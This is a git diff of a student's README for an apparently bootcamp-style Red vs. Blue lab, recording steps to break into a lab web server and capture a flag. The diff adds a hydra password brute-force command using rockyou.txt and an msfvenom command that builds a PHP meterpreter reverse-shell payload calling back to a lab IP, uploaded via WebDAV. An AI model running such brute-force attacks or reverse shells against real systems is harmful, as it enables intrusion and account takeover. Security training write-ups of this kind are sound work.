@@ -1,6 +1,5 @@
-# UCLA Project 2
-## Red vs. Blue Engagement
-### by Kurt Anderson
+# UCLA Project II - Red vs. Blue Engagement
+## by Kurt Anderson
 
 In this project I will work on a Red Team vs. Blue Team scenario in which I will play the roles of both Pentester and Security Operations Center Analyst.
 
@@ -35,6 +34,10 @@ I used dirb to enumerate any directories and identify the hidden folder.
 
 Using the username and password I was able to log into the host and found a Personal Note:
 
+Command:
+
+	hydra -l ashton -P /usr/share/wordlists/rockyou.txt
+
 ![Personal Note:](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/personal_note.jpg)
 
 ●	Break the hashed password with the Crack Station website or John the Ripper.
@@ -42,24 +45,26 @@ Using the username and password I was able to log into the host and found a Pers
 ![Cracked Password:](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/cracked_password.jpg)
 
 ●	Connect to the server via WebDav.
-○	Hint: Look for WebDAV connection instructions in the file located in the secret directory. Note that these instructions may have an old IP Address in them, so you will need to use the IP address you have discovered.
- 
+
+![WebDAV Credentials](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/webdav_login.PNG)
 
 ●	Upload a PHP reverse shell payload.
-○	Hint: Try using your scripting skills! MSVenom may also be helpful.
- 
- 
- 
- 
+Command: 
 
-●	Execute the payload that you uploaded to the site to open up a meterpreter session.
+	msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 raw > reverse_shell.php
+
+![Payload](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/msvenom.jpg)
+![WebDAV File Manager](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/webdav_reverse_shell.jpg)
+![WebDAV Browswer](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/webdav_upload.jpg)
  
+●	Execute the payload that you uploaded to the site to open up a meterpreter session.
+
+![Exploit Payload](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/payload.jpg)
+![Exploitation](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/exploitation.jpg)
 
 ●	Find and capture the flag.
 
- 
-After you have captured the flag, show it to your instructor.
-Be sure to save important files (e.g., scan results) and take screenshots as you work through the assessment. You'll use them again when creating your presentation.
+![Flag Found](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/meterpreter.jpg)
 
 
 Day 2 Activity File: Incident Analysis with Kibana
